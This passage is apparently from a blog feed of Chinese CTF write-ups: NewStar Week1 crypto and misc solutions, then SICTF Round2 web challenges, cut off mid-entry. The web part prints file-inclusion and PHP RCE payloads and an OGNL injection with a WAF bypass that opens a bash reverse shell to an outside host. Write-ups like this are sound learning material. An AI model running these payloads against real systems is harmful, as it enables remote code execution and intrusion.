class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = gen_prime(<span class="number">32</span>)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line"><span class="comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">P1 = <span class="number">2804303069</span></span><br><span class="line">P2 = <span class="number">2217990919</span></span><br><span class="line">P3 = <span class="number">2794985117</span></span><br><span class="line">P4 = <span class="number">3939901243</span></span><br><span class="line">P5 = <span class="number">2923072267</span></span><br><span class="line">P6 = <span class="number">2370292207</span></span><br><span class="line">P7 = <span class="number">2970591037</span></span><br><span class="line">P8 = <span class="number">2706073949</span></span><br><span class="line">P9 = <span class="number">2338725373</span></span><br><span class="line">P10 = <span class="number">2463878387</span></span><br><span class="line">P11 = <span class="number">3654864131</span></span><br><span class="line">P12 = <span class="number">4093178561</span></span><br><span class="line">P13 = <span class="number">3831680819</span></span><br><span class="line">P14 = <span class="number">4278428893</span></span><br><span class="line">P15 = <span class="number">3207148519</span></span><br><span class="line"></span><br><span class="line">n=<span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi=(P1-<span class="number">1</span>)*(P2-<span class="number">1</span>)*(P3-<span class="number">1</span>)*(P4-<span class="number">1</span>)*(P5-<span class="number">1</span>)*(P6-<span class="number">1</span>)*(P7-<span class="number">1</span>)*(P8-<span class="number">1</span>)*(P9-<span class="number">1</span>)*(P10-<span class="number">1</span>)*(P11-<span class="number">1</span>)*(P12-<span class="number">1</span>)*(P13-<span class="number">1</span>)*(P14-<span class="number">1</span>)*(P15-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">c=<span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;us4_s1ge_t0_cal_phI&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>超大的e，低解密指数攻击。</p><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">d = getPrime(<span class="number">32</span>)</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line"><span class="comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line"><span class="comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(python2的脚本)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: cp936 -*-</span><br><span class="line">import gmpy2</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 展开为连分数</span><br><span class="line">def continuedFra(x, y):</span><br><span class="line">    cF = []</span><br><span class="line">    while y:</span><br><span class="line">        cF += [x / y]</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line">def Simplify(ctnf):</span><br><span class="line">    numerator = 0</span><br><span class="line">    denominator = 1</span><br><span class="line">    for x in ctnf[::-1]:</span><br><span class="line">        numerator, denominator = denominator, x * denominator + numerator</span><br><span class="line">    return (numerator, denominator)</span><br><span class="line"></span><br><span class="line"># 连分数化简</span><br><span class="line">def calculateFrac(x, y):</span><br><span class="line">    cF = continuedFra(x, y)</span><br><span class="line">    cF = map(Simplify, (cF[0:i] for i in xrange(1, len(cF))))</span><br><span class="line">    return cF</span><br><span class="line"></span><br><span class="line"># 解韦达定理</span><br><span class="line">def solve_pq(a, b, c):</span><br><span class="line">    par = gmpy2.isqrt(b * b - 4 * a * c)</span><br><span class="line">    return (-b + par) / (2 * a), (-b - par) / (2 * a)</span><br><span class="line"></span><br><span class="line">def wienerAttack(e, n):</span><br><span class="line">    for (d, k) in calculateFrac(e, n):</span><br><span class="line">        if k == 0: continue</span><br><span class="line">        if (e * d - 1) % k != 0: continue</span><br><span class="line"></span><br><span class="line">        phi = (e * d - 1) / k</span><br><span class="line">        p, q = solve_pq(1, n - phi + 1, n)</span><br><span class="line">        if p * q == n:</span><br><span class="line">            return abs(int(p)), abs(int(q))</span><br><span class="line">    print &#x27;not find!&#x27;</span><br><span class="line"></span><br><span class="line">time.clock()</span><br><span class="line">c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="line">e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="line">n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br><span class="line">p, q = wienerAttack(e, n)</span><br><span class="line"></span><br><span class="line">print &#x27;[+]Found!&#x27;</span><br><span class="line">print &#x27;  [-]p =&#x27;,p</span><br><span class="line">print &#x27;  [-]q =&#x27;,q</span><br><span class="line">print &#x27;  [-]n =&#x27;,p*q</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">print &#x27;  [-]d =&#x27;, d</span><br><span class="line">print &#x27;  [-]m is:&#x27; + &#x27;&#123;:x&#125;&#x27;.format(pow(c,d,n)).decode(&#x27;hex&#x27;)</span><br><span class="line">print &#x27;\n[!]Timer:&#x27;, round(time.clock(),2), &#x27;s&#x27;</span><br><span class="line">print &#x27;[!]All Done!&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append(f ^ key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></span><br></pre></td></tr></table></figure><p>先拿<code>0xe9</code>和<code>f</code>异或，得到key为143，最后用 <a href="https://cyberchef.cn/">cyberchef</a> 解出来。</p><p><img src="/NewStar-CTF-Week1/c_5_1.png"></p><h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=</span><br><span class="line">part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=</span><br><span class="line">part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`</span><br></pre></td></tr></table></figure><p>part1 是base64，part2是base32，part3是uuencode。</p><p>最后得到flag：<code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</code></p><h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line">modulus = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">ciphertext = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag:</span><br><span class="line">    ciphertext.append((key[<span class="number">0</span>]*f + key[<span class="number">1</span>]) % modulus)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ciphertext).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></span><br></pre></td></tr></table></figure><p>根据flag头，可以列出两个方程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(1): (key[0]*&#x27;f&#x27;+key[1])%256=0xdd</span><br><span class="line">(2): (key[0]*&#x27;l&#x27;+key[1])%256=0x43</span><br></pre></td></tr></table></figure><p>（2）-（1）,即可得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(key[0]*6)%256=-154</span><br></pre></td></tr></table></figure><p>即可求出key[0]为 17，将key[0]代入，求出key[1]为23。</p><p>最后写脚本求出flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)%<span class="number">6</span>==<span class="number">0</span>:</span><br><span class="line">        a=(<span class="number">256</span>-<span class="number">154</span>+<span class="number">256</span>*i)//<span class="number">6</span></span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">b=<span class="number">0xdd</span>-(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>)*a)%<span class="number">256</span>       </span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">c=<span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="built_in">len</span>(c):</span><br><span class="line">    c1=c[i]+c[i+<span class="number">1</span>]</span><br><span class="line">    c2=<span class="built_in">int</span>(c1,<span class="number">16</span>)</span><br><span class="line">    i+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> (a*j + b) % <span class="number">256</span>==c2 :</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> data + <span class="string">b&quot;&quot;</span>.join([<span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span> - <span class="built_in">len</span>(data))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag_ = pad(flag)</span><br><span class="line">    key = os.urandom(<span class="number">16</span>) * <span class="number">2</span></span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="number">1</span>)</span><br><span class="line">    aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    enc_flag = aes.encrypt(flag_)</span><br><span class="line">    <span class="built_in">print</span>(enc_flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line"><span class="comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br></pre></td></tr></table></figure><p>根据源码，可以知道key的前后两段是一样的，vi再和aa异或后取后半段。所以我们可以得出key和vi。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">aa= <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line">a=long_to_bytes(aa)</span><br><span class="line"></span><br><span class="line">key1 = a[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line">iv=long_to_bytes(bytes_to_long(key1) ^ aa^<span class="number">1</span>)</span><br><span class="line">key=key1+key1</span><br><span class="line">iv=iv[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">c= <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag=aes.decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;firsT_cry_Aes\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>用CyberChef的megic方法即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_1_1.png"></p><h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>kali使用zsteg即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_2_1.png"></p><h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>Wireshark打开pacp文件，发现有很多http流量 。</p><p>过滤出返回200的包，可以看到有一个类似base64的返回包，猜测是flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</span><br></pre></td></tr></table></figure><p><img src="/NewStar-CTF-Week1/m_3_1.png"></p><p>base64解码2次即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</span><br></pre></td></tr></table></figure><h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>是<code>whitespace</code>，用 <a href="https://vii5ard.github.io/whitespace/">在线网站</a> 即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_4_1.png"></p><h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p><code>silenteye</code>，用<code>silenteye</code>打开点击decode即可得到flag。</p><p><img src="/NewStar-CTF-Week1/m_5_1.png"></p><h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><ol><li><p>文件用010打开，修复文件头即可解压出<code>flag.zip</code>。</p></li><li><p><code>flag.zip</code>，因为被修改了数据区，所以文件损坏。找一个正确加密的zip包对着改回来即可。</p></li><li><p>在压缩包的注释区发现了base64编码，解码后得到</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I like six-digit numbers because they are very concise and easy to remember.</span><br></pre></td></tr></table></figure><p>可知压缩包密码是6位数字。</p></li><li><p>爆破压缩包密码，得到，密码为<code>232311</code>，解压后即可得到flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
          <category> 新生赛 </category>
          
          <category> ak </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF_Round2</title>
      <link href="/SICTF_Round2/"/>
      <url>/SICTF_Round2/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="签到-Include"><a href="#签到-Include" class="headerlink" title="[签到]Include"></a>[签到]Include</h2><p>简单的文件包含，用伪协议读<code>/flag</code>即可得到flag.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?SICTF=php://filter/read=/resource=/flag</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/w_1_1.png"></p><h2 id="Baby-PHP"><a href="#Baby-PHP" class="headerlink" title="Baby_PHP"></a>Baby_PHP</h2><ol><li><p>先是php变量的特性，会将<code>[</code>, <code>+</code>, <code>.</code> 等特殊字符解析成<code>_</code>  。</p></li><li><p>绕过preg_match，因为是单行匹配，我们可以用换行绕过(<code>%0a</code>)，</p></li><li><p>接下来是无参数RCE，参考<a href="https://xz.aliyun.com/t/9360">这个博客</a> 。</p></li><li><p>利用<code>get_defined_vars()</code>，可以成功执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get: ?k+e[y=123%0a&amp;b=phpinfo();</span><br><span class="line"></span><br><span class="line">post: command=eval(end(current(get_defined_vars())));</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/w_2_1.png"></p></li><li><p>最后在根目录找到flag。</p><p><img src="/./SICTF_Round2/w_2_2.png"></p></li></ol><h2 id="pain"><a href="#pain" class="headerlink" title="pain"></a>pain</h2><p>参考博客：<a href="https://xz.aliyun.com/t/10482#toc-7">https://xz.aliyun.com/t/10482#toc-7</a></p><ol><li><p>用<code>jd-gui</code>查看jdk文件的内容。</p></li><li><p>在<code>pain.class</code>内，可以知道这是<code>Ognl的解析漏洞</code>。</p><p><img src="/./SICTF_Round2/w_3_1.png"></p></li><li><p>跟进<code>dinner_waf.let_me_see_see</code>方法，可以看到waf。</p><p><img src="/./SICTF_Round2/w_3_2.png"></p></li><li><p>可以看到，在检测waf前，会对payload进行一次url解码。尝试用<code>unicode编码</code>来绕过，发现可行。</p><p><img src="/./SICTF_Round2/w_3_3.png"></p></li><li><p>最后用这两条poc中的其中一个来进行反弹shell。</p><p><img src="/./SICTF_Round2/w_3_4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#编码前</span><br><span class="line">(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/7654du6216.zicp.fun/33699 0&gt;&amp;1&quot;&#125;)).start()</span><br><span class="line">#编码后</span><br><span class="line">/start?payload=(new%20java.lang.%5Cu0050%5Cu0072%5Cu006f%5Cu0063%5Cu0065%5Cu0073%5Cu0073%5Cu0042%5Cu0075%5Cu0069%5Cu006c%5Cu0064%5Cu0065%5Cu0072(new%20java.lang.String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F7654du6216.zicp.fun%2F33699%200%3E%261%22%7D)).start()</span><br></pre></td></tr></table></figure><p><img src="/./SICTF_Round2/w_3_5.png"></p></li></ol><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ol><li><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;(&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></li><li><p>过滤了<code>(</code>，<code>.</code> ，但发现反引号没被过滤，可以用反引号来rce，查看根目录的flag即可。</p></li><li><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post: code=echo `ls /`;</span><br></pre></td></tr></table></figure></li></ol><h2 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h2><ol><li><p>源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pop</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$i</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nogame</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/233333333/&quot;</span>,<span class="variable">$this</span>-&gt;pop))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这是一道签到题，不能让新生一直做不出来遭受打击&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">game</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;扣1送地狱火&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;i = <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=\&#x27;R.jpg\&#x27;&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;nogame-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;必须执行&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Aec</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$boy</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I also want to fall in love&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;girl != <span class="variable language_">$this</span>-&gt;boy &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;girl) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;boy))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;Aec-&gt;<span class="title function_ invoke__">game</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">P</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$MyLover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;有对象我会在这打CTF???看我克隆一个对象！&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$name</span> != <span class="string">&quot;game&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;打游戏去，别想着对象了&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;MyLover = <span class="keyword">clone</span> <span class="keyword">new</span> B;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>])&#123;</span><br><span class="line">    <span class="variable">$poc</span>=<span class="variable">$_GET</span>[<span class="string">&quot;A_B_C&quot;</span>];</span><br><span class="line">    <span class="title function_ 